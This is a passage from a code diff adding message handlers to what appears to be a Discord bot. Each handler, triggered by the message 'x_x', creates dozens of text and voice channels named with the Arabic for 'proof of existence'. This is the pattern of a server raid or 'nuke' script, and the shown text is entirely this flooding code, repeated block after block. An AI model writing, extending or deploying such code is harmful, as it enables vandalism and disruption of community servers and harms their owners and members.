+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+
+
+ }
+
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  if (!message.channel.guild) return;
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+
+
+ }
+
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  if (!message.channel.guild) return;
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+
+
+ }
+
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  if (!message.channel.guild) return;
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+
+
+ }
+
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  if (!message.channel.guild) return;
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+
+
+ }
+
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  if (!message.channel.guild) return;
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+
+
+ }
+
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  if (!message.channel.guild) return;
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+
+
+ }
+
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  if (!message.channel.guild) return;
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+
+
+ }
+
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  if (!message.channel.guild) return;
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
